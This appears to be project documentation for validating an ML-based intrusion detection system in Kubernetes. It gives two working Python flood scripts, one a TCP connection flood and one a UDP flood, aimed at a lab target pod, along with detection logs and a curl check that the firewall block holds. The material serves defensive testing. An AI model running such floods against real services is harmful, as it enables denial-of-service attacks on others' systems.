# IDS Attack Vectors & Validation

This document outlines some of the synthetic attack vectors used to validate the Intrusion Detection and Prevention System. These scripts are executed from within the `intruder` pod to simulate malicious traffic targeting the `secure-target` application.

## Prerequisites
Before launching any attacks, resolve the target's internal Kubernetes IP from the intruder pod's shell:
```bash
export TARGET_IP=$(kubectl get pod -l app=secure-target -o jsonpath='{.items[0].status.podIP}')

```

---

## 1. Multi-Threaded Volumetric Data Flood (TCP)

**Vector:** Opens 100 concurrent socket connections and blasts heavy padded payloads instantly.
**Targeted Features:** Spikes `Flow Byts/s`, `Fwd Pkts/s`, and `Fwd Pkt Len Std`.

### The Attack Command:

```bash
kubectl exec -it intruder -- env TARGET_IP=$TARGET_IP python3 -c "
import socket, os, concurrent.futures
target = os.environ['TARGET_IP']
def attack():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target, 80))
        s.sendall(b'CRASH' * 2000)
        s.close()
    except: pass
with concurrent.futures.ThreadPoolExecutor(max_workers=20) as executor:
    list(executor.map(lambda _: attack(), range(100)))
"

```

### Sensor Detection Logs:

The sensor successfully extracted the flow features, passed them to the ML API, and detected the anomalies with threat scores peaking around **0.78**. Once the score crosseed the `BLOCK_THRESHOLD`, `iptables` rules were automatically applied to sever the connection.

```text
2026-09-19 08:48:31,477 - ⚠️ SUSPICIOUS: 10.244.0.229 -> 10.244.0.224:80 | Threat Score: 0.6020
2026-09-19 08:48:31,526 - ⚠️ SUSPICIOUS: 10.244.0.229 -> 10.244.0.224:80 | Threat Score: 0.5963
2026-09-19 08:48:31,547 - 🚨 HIGH CONFIDENCE ATTACK! Blocking IP on Node: 10.244.0.229 | Threat Score: 0.7819

```

---

## 2. Asymmetric UDP Flood

**Vector:** Blasts massive UDP packets at a TCP port. Creates a heavily asymmetric flow with zero backward packets.
**Targeted Features:** Spikes `Fwd Pkts/s` and `Fwd Seg Size Avg` without corresponding TCP flags.

### The Attack Command:

```bash
kubectl exec -it intruder -- env TARGET_IP=$TARGET_IP python3 -c "
import socket, os, time
target = os.environ['TARGET_IP']
s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
payload = b'X' * 1400
t_end = time.time() + 3
while time.time() < t_end:
    s.sendto(payload, (target, 80))
"

```

### Sensor Detection Logs:

Because UDP is connectionless, the script continued to fire packets even after the firewall dropped them. The Scapy sniffer operates at the raw socket level (`eth0`), allowing the IDS to log the ongoing attack attempt while the firewall safely drops the malicious traffic before it reaches the web server.

```text
2026-09-19 11:37:13,788 - SUSPICIOUS: 10.244.0.106 -> 10.244.1.53:80 | Threat Score: 0.4536
2026-09-19 11:46:22,883 - HIGH CONFIDENCE ATTACK! Blocking IP on Node: 10.244.0.206
2026-09-19 11:46:42,961 - HIGH CONFIDENCE ATTACK! Blocking IP on Node: 10.244.0.206

```

---

## Mitigation Verification

To definitively prove that an attacker IP has been successfully isolated by the sensor's automated `iptables` rules, execute a standard TCP request from the blacklisted pod:

```bash
kubectl exec -it intruder -- curl --max-time 5 http://$TARGET_IP
```

*Expected Result:* The connection will completely hang and terminate with a timeout error, proving the network drop is actively enforced.

